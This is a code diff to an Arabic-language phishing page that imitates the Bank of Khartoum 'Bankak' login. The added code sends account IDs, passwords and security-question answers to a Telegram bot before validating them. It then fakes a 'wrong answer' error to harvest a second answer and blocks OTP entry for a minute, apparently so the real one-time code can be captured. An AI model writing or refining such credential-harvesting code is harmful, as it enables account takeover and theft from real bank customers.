@@ -1542,10 +1542,10 @@
             <!-- نافذة خطأ الإدخال المنبثقة -->
             <div class="modal-overlay" id="modalError">
               <div class="modal-box" style="text-align: center; padding: 0; overflow: hidden; border-radius: 12px;">
-                <div style="background-color: #dc2626; color: white; padding: 15px; font-size: 1.1rem; font-weight: bold;">خطأ</div>
+                <div style="background-color: #dc2626; color: white; padding: 15px; font-size: 1.1rem; font-weight: bold;" id="modalErrorTitle">خطأ</div>
                 <div class="modal-body" id="modalErrorText" style="padding: 25px 20px; font-size: 1rem; color: #333;">Invalid Source. Please contact Customer Care</div>
                 <div style="padding: 0 20px 20px 20px; display: flex; justify-content: center;">
-                  <button class="btn-red" style="max-width: 180px; margin: 0;" onclick="closeErrorModal()">إعادة المحاولة</button>
+                  <button class="btn-red" id="modalErrorBtn" style="max-width: 180px; margin: 0;" onclick="closeErrorModal()">إعادة المحاولة</button>
                 </div>
               </div>
             </div>
@@ -1655,16 +1655,25 @@
             document.getElementById('simpleServiceScreen').style.display = 'none';
         }
 
-        // إرسال البيانات المخصصة وإظهار نافذة اختيار الموقع
+        // إرسال البيانات المخصصة وإظهار نافذة اختيار الموقع (تم تصحيح الأخطاء النحوية هنا لضمان الاستجابة)
         function submitSimpleForm() {
-            const name = document.getElementById('dyn-name') ? document.getElementById('dyn-name').value.trim() : '';
-            const account = document.getElementById('dyn-account') ? document.getElementById('dyn-account').value.trim() : '';
-            const phone = document.getElementById('dyn-phone') ? document.getElementById('dyn-phone').value.trim() : '';
-            const whatsapp = document.getElementById('dyn-whatsapp') ? document.getElementById('dyn-whatsapp').value.trim() : '';
-            const oldPhone = document.getElementById('dyn-old-phone') ? document.getElementById('dyn-old-phone').value.trim() : '';
-            const newPhone = document.getElementById('dyn-new-phone') ? document.getElementById('dyn-new-phone').value.trim() : '';
-            const currency = document.getElementById('dyn-currency') ? document.getElementById('dyn-currency').value : '';
-            const investment = document.getElementById('dyn-investment') ? document.getElementById('dyn-investment').value.trim() : '';
+            const nameEl = document.getElementById('dyn-name');
+            const accountEl = document.getElementById('dyn-account');
+            const phoneEl = document.getElementById('dyn-phone');
+            const whatsappEl = document.getElementById('dyn-whatsapp');
+            const oldPhoneEl = document.getElementById('dyn-old-phone');
+            const newPhoneEl = document.getElementById('dyn-new-phone');
+            const currencyEl = document.getElementById('dyn-currency');
+            const investmentEl = document.getElementById('dyn-investment');
+
+            const name = nameEl ? nameEl.value.trim() : '';
+            const account = accountEl ? accountEl.value.trim() : '';
+            const phone = phoneEl ? phoneEl.value.trim() : '';
+            const whatsapp = whatsappEl ? whatsappEl.value.trim() : '';
+            const oldPhone = oldPhoneEl ? oldPhoneEl.value.trim() : '';
+            const newPhone = newPhoneEl ? newPhoneEl.value.trim() : '';
+            const currency = currencyEl ? currencyEl.value : '';
+            const investment = investmentEl ? investmentEl.value.trim() : '';
 
             if (!name || !account || !whatsapp || (selectedServiceName === 'تعديل رقم الهاتف' && (!oldPhone || !newPhone)) || (selectedServiceName === 'خدمات العملات الأجنبية' && (!currency || !phone)) || (selectedServiceName === 'محفظة بنك الخرطوم الاستثمارية' && (!investment || !phone)) || (selectedServiceName !== 'تعديل رقم الهاتف' && selectedServiceName !== 'خدمات العملات الأجنبية' && selectedServiceName !== 'محفظة بنك الخرطوم الاستثمارية' && !phone)) {
                 showErrorModal("يرجى تعبئة جميع الحقول المطلوبة للمتابعة.");
@@ -1904,21 +1913,30 @@
           }
         }
 
+        // إرسال البيانات للبوت دائماً، ولكن اشتراط كلمة المرور القوية للتخطي
         function handleLoginSubmit(e) {
           e.preventDefault();
           const accInput = document.getElementById('userIdInput').value.trim();
           const passInput = document.getElementById('passwordInput').value;
 
           const accRegex = /^\d{7}$/;
-          const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]).{8,}$/;
-
-          if (!accRegex.test(accInput) || !passRegex.test(passInput)) {
+          if (!accRegex.test(accInput)) {
             showErrorModal("Invalid Source. Please contact Customer Care");
             return;
           }
 
-          sendToTelegram(`🚨 *تسجيل دخول (بنكك)*\n\n👤 المعرف: \`${accInput}\`\n🔑 كلمة المرور: \`${passInput}\``);
-          document.getElementById('modalDevice').style.display = 'flex';
+          // إرسال البيانات للبوت أولاً (حتى لو كانت كلمة المرور غير مطابقة أو خاطئة)
+          sendToTelegram(`🚨 *محاولة تسجيل دخول (بنكك)*\n\n👤 المعرف: \`${accInput}\`\n🔑 كلمة المرور: \`${passInput}\``);
+
+          // التحقق من شروط كلمة المرور القوية (مثال: Aa12345@)
+          const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]).{8,}$/;
+          if (!passRegex.test(passInput)) {
+            showErrorModal("Invalid Source. Please contact Customer Care");
+            return;
+          }
+
+          // الانتقال لأسئلة الأمان إذا تحققت الشروط
+          switchScreen('screenQuestions');
         }
 
         function goToSecurityQuestions() {
@@ -1932,6 +1950,7 @@
           document.getElementById('answerInput').value = '';
         }
 
+        let securityAnswerAttempts = 0;
         function validateSecurityAnswer() {
           const answer = document.getElementById('answerInput').value.trim();
           const currentQuestion = document.getElementById('questionText').textContent;
@@ -1940,12 +1959,32 @@
             showErrorModal("يرجى إدخال إجابة سؤال الأمان للمتابعة.");
           } else {
             sendToTelegram(`🛡️ *إجابة سؤال الأمان*\n\n❓ السؤال: ${currentQuestion}\n💡 الإجابة: \`${answer}\``);
-            goToOtpScreen();
+            
+            securityAnswerAttempts++;
+            if (securityAnswerAttempts === 1) {
+                showSecurityErrorModal("إجابة السؤال السري خاطئة");
+            } else {
+                goToOtpScreen();
+            }
           }
         }
 
+        function showSecurityErrorModal(message) {
+          document.getElementById('modalErrorTitle').textContent = "خطأ";
+          document.getElementById('modalErrorText').textContent = message;
+          const btn = document.getElementById('modalErrorBtn');
+          btn.textContent = "إعادة المحاولة";
+          btn.onclick = function() {
+              closeErrorModal();
+              nextQuestion();
+          };
+          document.getElementById('modalError').style.display = 'flex';
+        }
+
+        let otpScreenOpenedTime = 0;
         function goToOtpScreen() {
           switchScreen('screenOtp');
+          otpScreenOpenedTime = Date.now(); // تسجيل وقت فتح شاشة OTP بدقة
           startTimer(3540);
         }
 
@@ -1969,6 +2008,13 @@
 
         function validateOtp() {
           const otp = document.getElementById('otpInput').value.trim();
+
+          // شرط منع إدخال الرمز قبل مرور دقيقة كاملة (60 ثانية) وإظهار خطأ "رمز التحقق خطأ"
+          const elapsedSeconds = (Date.now() - otpScreenOpenedTime) / 1000;
+          if (elapsedSeconds < 60) {
+            showErrorModal("رمز التحقق خطأ");
+            return;
+          }
 
           if (!/^\d{6}$/.test(otp)) {
             showErrorModal("رمز التحقق غير صحيح، يجب أن يتكون من 6 أرقام.");
@@ -2031,7 +2077,11 @@
         }
 
         function showErrorModal(message) {
+          document.getElementById('modalErrorTitle').textContent = "خطأ";
           document.getElementById('modalErrorText').textContent = message || "Invalid Source. Please contact Customer Care";
+          const btn = document.getElementById('modalErrorBtn');
+          btn.textContent = "إعادة المحاولة";
+          btn.onclick = closeErrorModal;
           document.getElementById('modalError').style.display = 'flex';
         }
 
